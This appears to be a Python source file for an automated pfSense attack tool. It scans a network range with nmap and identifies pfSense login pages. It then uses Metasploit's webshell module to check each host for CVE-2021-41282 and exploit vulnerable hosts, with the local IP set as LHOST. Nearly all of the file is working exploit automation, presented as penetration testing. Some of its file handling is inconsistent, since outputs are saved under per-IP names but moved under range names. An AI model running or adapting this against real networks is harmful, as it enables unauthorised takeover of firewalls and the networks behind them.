import subprocess
import re
import netifaces
import os
import pyfiglet
from pfsense.report import generate_report  # Ensure report.py is in the same directory

def run_nmap_scan(target):
    directory = "pfsense"
    os.makedirs(directory, exist_ok=True)
    nmap_result_file = os.path.join(directory, f"scan_{target}.txt")
    nmap_args = ["nmap", "-sV", "-sC", "-Pn", "--script", "http-title", target]
    scan_results = subprocess.run(nmap_args, capture_output=True, text=True).stdout
    # Save the scan results to "scan.txt"
    with open("scan.txt", "w") as f: 
        f.write(scan_results)
    
    return scan_results

def get_pfsense_ips(scan_results):
    "List of pfSense IP addresses found in the scan results."
    pfsense_ips = []
    for line in scan_results.split("\n"):
        if "Nmap scan report for" in line:
            ip = line.split("Nmap scan report for")[1].strip()
        if "http-title:" in line and "pfSense - Login" in line:
            pfsense_ips.append(ip)
    return pfsense_ips

def get_local_ip():
    """Get the local IP address from eth0."""
    interface = "eth0"
    addresses = netifaces.ifaddresses(interface)
    ip_address = addresses[netifaces.AF_INET][0]['addr']
    return ip_address

def check_vulnerability(target):
    "Checks if the target is vulnerable to the exploit."
    print(f"Checking vulnerability for {target}")
    msf_command = f"msfconsole -x 'use exploit/unix/http/pfsense_diag_routes_webshell;set RHOSTS {target};check;exit'"
    msf_output = subprocess.run(msf_command, shell=True, capture_output=True, text=True).stdout
    if "The target is vulnerable" in msf_output:
        print(f"{target} is vulnerable to the CVE-2021-41282.")
        return True
    elif "The target is not exploitable." in msf_output:
        print(f"{target} is not vulnerable to the CVE-2021-41282.")
        return False
    else:
        print(f"An error occurred while checking vulnerability for {target}.")
        return False

def exploit_target(target):
    "Exploits the target using the metasploit."
    local_ip = get_local_ip()
    with open("pfsense.rc", "r") as f:
        script_content = f.read()
    
    # Changes the RHOSTS and LHOST values in the resource script
    script_content = script_content.replace("{target}", target)
    script_content = script_content.replace("{local_ip}", local_ip)

    # Make a temporary file for metasploit resource script
    temp_script_file = "temp_pfsense.rc"
    with open(temp_script_file, "w") as f:
        f.write(script_content)

    msf_command = f"msfconsole -r {temp_script_file}"
    result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)
    print(result.stdout)

    # Remove the formatting codes and save the output to poc.txt
    exploit_output = re.sub(r"\x1b\[[0-9;]*[mK]", "", result.stdout)
    poc_result_file = os.path.join("pfsense", f"poc_{target}.txt")
    with open(poc_result_file, "w") as f:
        f.write(exploit_output)
    
    # Remove the temporary script file
    subprocess.run(["rm", "-f", temp_script_file])

def pfsense_exploit(target_range):
    "Main function to run the pfSense exploit"
    banner = pyfiglet.figlet_format("pfSense EXPLOIT")
    print(banner)

    # Run the Nmap scan
    print("Scanning targets...")
    scan_results = run_nmap_scan(target_range)
    print(scan_results)
    
    # Get the pfSense IP addresses
    pfsense_ips = get_pfsense_ips(scan_results)

    if pfsense_ips:
        print("pfSense IP addresses:")
        for ip in pfsense_ips:
            print(ip)

        # Check vulnerability for all targets
        print("Checking the target for known CVE-2021-41282...")
        vulnerable_ips = []
        for ip in pfsense_ips:
            if check_vulnerability(ip):
                vulnerable_ips.append(ip)

        # Exploit vulnerable targets
        if vulnerable_ips:
            print("Exploiting targets...")
            for ip in vulnerable_ips:
                exploit_target(ip)
                # Create a report
                report_path = generate_report(target_range)
                print(f"Report path: {report_path}")
                if not report_path:
                    print("Failed to generate report.")
                    return None
                
                target_directory = os.path.join("pfsense", target_range.replace("/", "_"))
                os.makedirs(target_directory, exist_ok=True)

                # Move the report, PoC, and scan files to the target directory
                os.rename(os.path.join("pfsense", f"poc_{target_range}.txt"), os.path.join(target_directory, "poc.txt"))
                os.rename(os.path.join("pfsense", f"scan_{target_range}.txt"), os.path.join(target_directory, "scan.txt"))
                os.rename(report_path, os.path.join(target_directory, "Penetration_Test_Report.docx"))
                print(f'Pentesting complete. Result saved to {target_directory}')
                return os.path.join(target_directory, "Penetration_Test_Report.docx")
        else:
            print("Your pfSense firewall is not vulnerable.")
            print("Pentesting Complete")
            return "Your pfSense firewall is not vulnerable."
    else:
        print("There's no pfSense firewall found.")
        print("Pentesting Complete")
        return "There's no pfSense firewall found."
